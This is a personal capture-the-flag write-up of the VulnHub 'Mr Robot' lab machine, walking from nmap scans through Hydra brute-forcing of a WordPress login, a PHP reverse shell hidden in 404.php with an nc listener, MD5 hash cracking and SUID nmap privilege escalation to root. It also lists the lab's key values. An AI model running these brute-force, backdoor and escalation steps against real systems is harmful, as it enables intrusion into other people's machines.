## MrRobot Writeup

### Goal: This has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.

### Level: Intermediate

#### [Download Link](https://www.vulnhub.com/?q=mr+robot&sort=date-des&type=vm#)


### Information Gathering

Host Machine IP: 192.168.56.1 and 10.100.16.210
Kali Machine IP: 192.168.56.102 and 10.0.2.15
Target IP :  

Monologue: It took me quite awhile to setup my network. So when you run into trouble with adapter setting don't worry. Either you change the adapter setting in the virtual machine on both the systems (attacker and target machines) and then do a restart or ```ifconfig eth0 down``` (your interface name may be different like eth1 or wlan0 or wlan1 etc) and then do ```ifconfig eth0 up``` will do the trick. I know this but I ran into rather peculiar problem ?!!

- ```netdiscover -1 eth1 -r 192.168.56.102/24```

- ![](images/netdiscover.png)


### Scanning

- ```nmap -sC -sV -p- -A 192.168.56.102 > nmap.txt```

- -sC script
- -sV service version
- -p- all port (1-65535)
- -A it consists of sV functionality as well, I just add it to get (-O) OS detection and few other (don't want to miss anything)
- nmap.txt (although nmap has custom ouput parameter to pass but I prefer this way)

- ![](images/nmap.png)

Monologue: I can't see much infomration. Since it has both port 80 and 443 is running, I am quite certain that it is running a web server. Let me try my luck.

- ![](images/web-source.png)

- I got lucky when I was trying to get the invitation code during my [Hackthebox](https://www.hackthebox.eu/). Therefore, I dive into the source code and didn't spare many attached links. But didn't get anything useful.

- My next step is to try with robots.txt

- Look what I got.... OMG!!  First flag...

- ![](images/robots.png)

- Key 01

- ![](images/key1.png)

- ### Download the dictionary file: I enlarged the font size because I might have to use this in the future.

- ![](images/dic.png)


Note: Since the machine is running webserver therefore I am going to run nikto and dirb (provided I didn't get what I want using nikto).

- ```nikto -h 192.168.56.102 -p 80 > nikto.txt```

  - It is taking lot of time, I hope my wait is worth it :) Its been more than 30 minutes and I don't like this feeling. Therefore, although nikto scan was not completed. I openned a tab and did `cat nikto80.txt`  

  - I saw ```tnc```. To be honest, I have no idea what it is, I just past this in the url.

  - ![](images/tnc.png)

  - I got this error message.  If you have some experience with WordPress, you will come to know, this site is running WordPress.
  - ![](images/tnc2.png)

  - Then I visit the admin panel.  

  - ```http://192.168.56.103/wp-admin```

  - ![](images/wp-admin.png)


  Monologue:  I am quite sure that you remember that along with our very first-key, we also downloaded a file called f-socity.dic

  - ```nikto -h 192.168.56.102 -p 443 > nikto.txt```



### Vulnerable Assessment


### Exploitation
- I am going to brute force the WordPress login page. However let me put some dummy data and get the error message. I am going to use this as a flag.

- ![](images/invalid-username.png)

- ```Invalid username```    will be my flag

- Brute Force (Reference 1 in the footer)
  -  ```hydra -vV -L fsocity.dic -p test http://192.168.56.103 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'```

- Brief Explaination:
  - [Hydra]() is a popular brute forcing program.
  - vV verbose
  - L use L when your don't know the username. If you know the username, use small l
  - fsocity.dic is the dictionary file we downloaded the target website.
  - p use small p if you know the password. If you don't know the password use capital P follow by dictionary file.
  - http-post-form is the post method
  - remaining is quite self explanatory.

Through bruteforce I got the username: Elliot

- Actually I can directly proceed with the password bruteforce attack. But I will first enter it in the wp-login and get the error message. I will use that as a flag to reduce the noise.

- ![](images/incorrect.png)

- ```Incorrect```  will be my flag.

- ``` hydra -vV -l Elliot -P fsocity.dic 192.168.56.103 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect'```


- It does take hell lot of time and I thought to sort the dictionary and list only the unique entry. Gosh! I wasted a hell lot of time. However, no worry!

- ```sort fosocity.dic | uniq | tee fosocity-mini.txt```

- File size reduced drastically.

- Yet it will surely take sometime, so why not I prepare a PHP reverse shell ;)  

- ![](images/mini.png)

- Got a friend's call and didn't get time to dig into shell. However, I got the password after an hour (quite close to an hour actually)


- ![](images/password.png)

***

#### Information We have
URL: http://192.168.56.103/wp-admin
Username: Elliot
Password: ER28-0652

***

Monologue: I have worked as Web Master in the past therefore, I know a little on usually how people use to check their file integrity. However, people hardly audit the code in 404.php. Therefore, my strategy is to hide my backdoor in that page. (I am quite lucky that Edit functionality is on in the dashboard; if you are wordpress user, you know what I am saying)

- I got the php reverse shell from [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
- At first what I did was, open a terminal on my kali machine and typed this command
  - ```nc -lvp 9000```    #### Listening mode will be on

  - ![](images/listen.png)

- Then I opened the php-reverse-shell and replace the ip address which you want to have connection back on. In my case, I want to have the connection back to my kali machine (192.168.56.102) and I replaced the port number with my favourite one i.e. 9000.
- As soon as I visit the 404.php (192.168.56.102/)
- I got the reverse shell prompt.
- I did ls and saw many things but ```root``` folder and  ```home``` interested me the most.
- I couldn't get into the ```root```. Therefore, I changed my directory to home and found there is a folder called robot. Inside robot, I found my second key and a file.
- Unlucky, I can't see the key file. It looks like I have to crack that hash and use that information to gain the privilege and then see the key2. (Tough but I like that!)

- ![](images/hash.png)

- ```Username: robot``` <br />
Password: hash Decrypt(c3fcd3d76192e4007dfb496cca67e13b
)
- ```Password:abcdefghijklmnopqrstuvwxyz```  

- You might not believed but it took me hours googling and going through related threads on stackoverflow.

- I know I need something to escalate my privilege. I thought to give it a go with dirty-cow exploit. When I was reading, it mentioned about misconfiguration on SUID. Therefore, I found [this](https://null-byte.wonderhowto.com/how-to/use-misconfigured-suid-bit-escalate-privileges-get-root-0173929/).

- ```find / -user root -perm -4000 -print 2>/dev/null```


- ![](images/priv.png)


- ```nmap --interactive```

- It didn't work for me. I went to prepare thenthuk(Tibetan broth Noodle; very delicious one and specially recommended when the weather is cold) and about to have dinner.

- I typed
  - ```/usr/local/bin/nmap --interactive```   ### It worked!!

  - ![](images/interactive.png)


  - ```!sh```


  - ```whoami```  it shows I am the root!

  - ```cd /root``` and followed by ```key-3-of-3.txt```

  - ```04787ddef27c3dee1ee161b21670b4e4```

  - I am yet to get my key 2. Therefore, let's go to /home folder

  - ```cd /home``` ,  ```cd robot```, ```cat key-2-of-3.txt ```

  - Finally!!  ```822c73956184f694993bede3eb39f959```

  - ![](images/keys.txt)

### Post Exploitation

Sorry, I was too caught-up in this and didn't get time to properly put into respective stages :)

### Reference links

[1](https://blog.dewhurstsecurity.com/2013/04/17/http-form-password-brute-forcing-the-need-for-speed.html), [2](https://unix.stackexchange.com/questions/261043/give-the-command-to-remove-duplicate-lines-in-a-txt-file-and-save-the-new-file), [3](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), [4](https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b), [5](https://null-byte.wonderhowto.com/how-to/use-misconfigured-suid-bit-escalate-privileges-get-root-0173929/), [6](https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/), [7](https://null-byte.wonderhowto.com/how-to/use-misconfigured-suid-bit-escalate-privileges-get-root-0173929/), [8](https://pentestlab.blog/category/privilege-escalation/), [9](https://null-byte.wonderhowto.com/how-to/use-misconfigured-suid-bit-escalate-privileges-get-root-0173929/), [10](https://www.gracefulsecurity.com/linux-privesc-abusing-suid/), [](),
